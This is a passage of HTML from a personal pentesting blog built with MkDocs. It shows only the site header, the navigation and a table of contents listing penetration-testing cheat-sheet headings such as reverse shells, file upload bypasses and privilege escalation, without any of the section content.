
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Projects Showcase">
      
      
      
        <link rel="canonical" href="http://blog.cuhawk.co.uk/pentesting/">
      
      
        <link rel="prev" href="../programming/Milk%20App%20c%23/">
      
      
        <link rel="next" href="Evasion/">
      
      
      <link rel="icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.0, mkdocs-material-9.5.27">
    
    
      
        <title>Home - Cuhawk's Blog</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.6543a935.min.css">
      
        
        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#active-directory-pentest" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href=".." title="Cuhawk&#39;s Blog" class="md-header__button md-logo" aria-label="Cuhawk's Blog" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Cuhawk's Blog
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Home
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
    <li class="md-tabs__item">
      <a href=".." class="md-tabs__link">
        
  
    
  
  Home

      </a>
    </li>
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../programming/" class="md-tabs__link">
          
  
  Programming

        </a>
      </li>
    
  

      
        
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="./" class="md-tabs__link">
          
  
  Pentesting

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../certifications/oscp/" class="md-tabs__link">
          
  
  Certifications

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href=".." title="Cuhawk&#39;s Blog" class="md-nav__button md-logo" aria-label="Cuhawk's Blog" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    Cuhawk's Blog
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href=".." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Home
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Programming
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Programming
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../programming/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DSA
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../programming/DSA/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DFS vs BFS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../programming/bitwise/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bitwise
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../programming/Maximize%20shortcut%20nodes/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Max Number of Edges
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../programming/Sorting%20Idealogy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Sorting Idealogy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../programming/Tree%20Use%20Idealogy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Tree Use Idealogy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../programming/Snake/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Snake C++
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../programming/Booking%20API%20C%23/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Booking API
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../programming/GameServer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Game Server
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../programming/Milk%20App%20c%23/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Milk Storage C#
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
      
        
        
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Pentesting
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Pentesting
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    Home
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    Home
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#reconnaissance-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance / Enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reconnaissance / Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#extracting-live-ips-from-nmap-scan" class="md-nav__link">
    <span class="md-ellipsis">
      Extracting Live IPs from Nmap Scan
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#simple-port-knocking" class="md-nav__link">
    <span class="md-ellipsis">
      Simple Port Knocking
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dns-lookups-zone-transfers-brute-force" class="md-nav__link">
    <span class="md-ellipsis">
      DNS lookups, Zone Transfers &amp; Brute-Force
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#banner-grabbing" class="md-nav__link">
    <span class="md-ellipsis">
      Banner Grabbing
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nfs-exported-shares" class="md-nav__link">
    <span class="md-ellipsis">
      NFS Exported Shares
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kerberos-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Kerberos Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#http-brute-force-vulnerability-scanning" class="md-nav__link">
    <span class="md-ellipsis">
      HTTP Brute-Force &amp; Vulnerability Scanning
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rpc-netbios-smb" class="md-nav__link">
    <span class="md-ellipsis">
      RPC / NetBios / SMB
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#snmp" class="md-nav__link">
    <span class="md-ellipsis">
      SNMP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smtp" class="md-nav__link">
    <span class="md-ellipsis">
      SMTP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#active-directory" class="md-nav__link">
    <span class="md-ellipsis">
      Active Directory
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listen-on-a-port-powershell" class="md-nav__link">
    <span class="md-ellipsis">
      Listen on a port (Powershell)
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#gaining-access" class="md-nav__link">
    <span class="md-ellipsis">
      Gaining Access
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Gaining Access">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reverse-shell-one-liners" class="md-nav__link">
    <span class="md-ellipsis">
      Reverse Shell One-Liners
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reverse Shell One-Liners">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bash" class="md-nav__link">
    <span class="md-ellipsis">
      Bash
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#perl" class="md-nav__link">
    <span class="md-ellipsis">
      Perl
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#url-encoded-perl-linux" class="md-nav__link">
    <span class="md-ellipsis">
      URL-Encoded Perl: Linux
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#python" class="md-nav__link">
    <span class="md-ellipsis">
      Python
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#php" class="md-nav__link">
    <span class="md-ellipsis">
      PHP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ruby" class="md-nav__link">
    <span class="md-ellipsis">
      Ruby
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#netcat-without-e-1" class="md-nav__link">
    <span class="md-ellipsis">
      Netcat without -e #1
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#netcat-without-e-2" class="md-nav__link">
    <span class="md-ellipsis">
      Netcat without -e #2
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#java" class="md-nav__link">
    <span class="md-ellipsis">
      Java
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xterm" class="md-nav__link">
    <span class="md-ellipsis">
      XTerm
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#jdwp-rce" class="md-nav__link">
    <span class="md-ellipsis">
      JDWP RCE
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#working-with-restricted-shells" class="md-nav__link">
    <span class="md-ellipsis">
      Working with Restricted Shells
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#interactive-tty-shells" class="md-nav__link">
    <span class="md-ellipsis">
      Interactive TTY Shells
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#uploadingposting-files-through-www-upload-forms" class="md-nav__link">
    <span class="md-ellipsis">
      Uploading/POSTing Files Through WWW Upload Forms
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#puting-file-on-the-webhost-via-put-verb" class="md-nav__link">
    <span class="md-ellipsis">
      PUTing File on the Webhost via PUT verb
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#generating-payload-pattern-calculating-offset" class="md-nav__link">
    <span class="md-ellipsis">
      Generating Payload Pattern &amp; Calculating Offset
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bypassing-file-upload-restrictions" class="md-nav__link">
    <span class="md-ellipsis">
      Bypassing File Upload Restrictions
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#injecting-php-into-jpeg" class="md-nav__link">
    <span class="md-ellipsis">
      Injecting PHP into JPEG
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#uploading-htaccess-to-interpret-blah-as-php" class="md-nav__link">
    <span class="md-ellipsis">
      Uploading .htaccess to interpret .blah as .php
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cracking-passwords" class="md-nav__link">
    <span class="md-ellipsis">
      Cracking Passwords
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Cracking Passwords">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#cracking-web-forms-with-hydra" class="md-nav__link">
    <span class="md-ellipsis">
      Cracking Web Forms with Hydra
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cracking-common-protocols-with-hydra" class="md-nav__link">
    <span class="md-ellipsis">
      Cracking Common Protocols with Hydra
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hashcat-cracking" class="md-nav__link">
    <span class="md-ellipsis">
      HashCat Cracking
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#generating-payload-with-msfvenom" class="md-nav__link">
    <span class="md-ellipsis">
      Generating Payload with msfvenom
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#compiling-code-from-linux" class="md-nav__link">
    <span class="md-ellipsis">
      Compiling Code From Linux
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#compiling-assembly-from-windows" class="md-nav__link">
    <span class="md-ellipsis">
      Compiling Assembly from Windows
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#local-file-inclusion-to-shell" class="md-nav__link">
    <span class="md-ellipsis">
      Local File Inclusion to Shell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#local-file-inclusion-reading-files" class="md-nav__link">
    <span class="md-ellipsis">
      Local File Inclusion: Reading Files
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remote-file-inclusion-shell-windows-php" class="md-nav__link">
    <span class="md-ellipsis">
      Remote File Inclusion Shell: Windows + PHP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sql-injection-to-shell-or-backdoor" class="md-nav__link">
    <span class="md-ellipsis">
      SQL Injection to Shell or Backdoor
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sqlite-injection-to-shell-or-backdoor" class="md-nav__link">
    <span class="md-ellipsis">
      SQLite Injection to Shell or Backdoor
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ms-sql-console" class="md-nav__link">
    <span class="md-ellipsis">
      MS-SQL Console
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#upgradig-non-interactive-shell" class="md-nav__link">
    <span class="md-ellipsis">
      Upgradig Non-Interactive Shell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#python-input-code-injection" class="md-nav__link">
    <span class="md-ellipsis">
      Python Input Code Injection
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#local-enumeration-privilege-escalation" class="md-nav__link">
    <span class="md-ellipsis">
      Local Enumeration &amp; Privilege Escalation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Local Enumeration & Privilege Escalation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-applocker-policies" class="md-nav__link">
    <span class="md-ellipsis">
      Check AppLocker Policies
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#applocker-writable-windows-directories" class="md-nav__link">
    <span class="md-ellipsis">
      Applocker: Writable Windows Directories
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#find-writable-filesfolders-in-windows" class="md-nav__link">
    <span class="md-ellipsis">
      Find Writable Files/Folders in Windows
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-if-powershell-logging-is-enabled" class="md-nav__link">
    <span class="md-ellipsis">
      Check if Powershell Logging is Enabled
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-winevent-logs-for-securestring-exposure" class="md-nav__link">
    <span class="md-ellipsis">
      Check WinEvent Logs for SecureString Exposure
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-winevent-for-machine-wakesleep-times" class="md-nav__link">
    <span class="md-ellipsis">
      Check WinEvent for Machine Wake/Sleep times
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#audit-policies" class="md-nav__link">
    <span class="md-ellipsis">
      Audit Policies
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-if-lsass-is-running-in-ppl" class="md-nav__link">
    <span class="md-ellipsis">
      Check if LSASS is running in PPL
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#binary-exploitation-with-immunitydebugger" class="md-nav__link">
    <span class="md-ellipsis">
      Binary Exploitation with ImmunityDebugger
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Binary Exploitation with ImmunityDebugger">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#get-loaded-modules" class="md-nav__link">
    <span class="md-ellipsis">
      Get Loaded Modules
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#finding-jmp-esp-address" class="md-nav__link">
    <span class="md-ellipsis">
      Finding JMP ESP Address
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cracking-a-zip-password" class="md-nav__link">
    <span class="md-ellipsis">
      Cracking a ZIP Password
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#setting-up-simple-http-server" class="md-nav__link">
    <span class="md-ellipsis">
      Setting up Simple HTTP server
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mysql-user-defined-fuction-privilge-escalation" class="md-nav__link">
    <span class="md-ellipsis">
      MySQL User Defined Fuction Privilge Escalation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docker-privilege-esclation" class="md-nav__link">
    <span class="md-ellipsis">
      Docker Privilege Esclation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#resetting-root-password" class="md-nav__link">
    <span class="md-ellipsis">
      Resetting root Password
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#uploading-files-to-target-machine" class="md-nav__link">
    <span class="md-ellipsis">
      Uploading Files to Target Machine
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Uploading Files to Target Machine">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#tftp" class="md-nav__link">
    <span class="md-ellipsis">
      TFTP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ftp" class="md-nav__link">
    <span class="md-ellipsis">
      FTP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#certutil" class="md-nav__link">
    <span class="md-ellipsis">
      CertUtil
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#php_1" class="md-nav__link">
    <span class="md-ellipsis">
      PHP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#python_1" class="md-nav__link">
    <span class="md-ellipsis">
      Python
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#http-powershell" class="md-nav__link">
    <span class="md-ellipsis">
      HTTP: Powershell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#http-vbscript" class="md-nav__link">
    <span class="md-ellipsis">
      HTTP: VBScript
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#http-linux" class="md-nav__link">
    <span class="md-ellipsis">
      HTTP: Linux
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#netcat" class="md-nav__link">
    <span class="md-ellipsis">
      NetCat
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#http-windows-debugexe-method" class="md-nav__link">
    <span class="md-ellipsis">
      HTTP: Windows "debug.exe" Method
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#http-windows-bitsadmin" class="md-nav__link">
    <span class="md-ellipsis">
      HTTP: Windows BitsAdmin
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#wscript-script-code-download-execution" class="md-nav__link">
    <span class="md-ellipsis">
      Wscript Script Code Download &amp; Execution
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#whois-data-exfiltration" class="md-nav__link">
    <span class="md-ellipsis">
      Whois Data Exfiltration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cancel-data-exfiltration" class="md-nav__link">
    <span class="md-ellipsis">
      Cancel Data Exfiltration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rlogin-data-exfiltration" class="md-nav__link">
    <span class="md-ellipsis">
      rlogin Data Exfiltration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bash-ping-sweeper" class="md-nav__link">
    <span class="md-ellipsis">
      Bash Ping Sweeper
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#brute-forcing-xored-string-with-1-byte-key-in-python" class="md-nav__link">
    <span class="md-ellipsis">
      Brute-forcing XOR'ed string with 1 byte key in Python
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#generating-bad-character-strings" class="md-nav__link">
    <span class="md-ellipsis">
      Generating Bad Character Strings
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#converting-python-to-windows-executable-py-exe" class="md-nav__link">
    <span class="md-ellipsis">
      Converting Python to Windows Executable (.py -&gt; .exe)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#port-scanning-with-netcat" class="md-nav__link">
    <span class="md-ellipsis">
      Port Scanning with NetCat
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#port-scanning-with-masscan" class="md-nav__link">
    <span class="md-ellipsis">
      Port Scanning with Masscan
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploiting-vulnerable-windows-services-weak-service-permissions" class="md-nav__link">
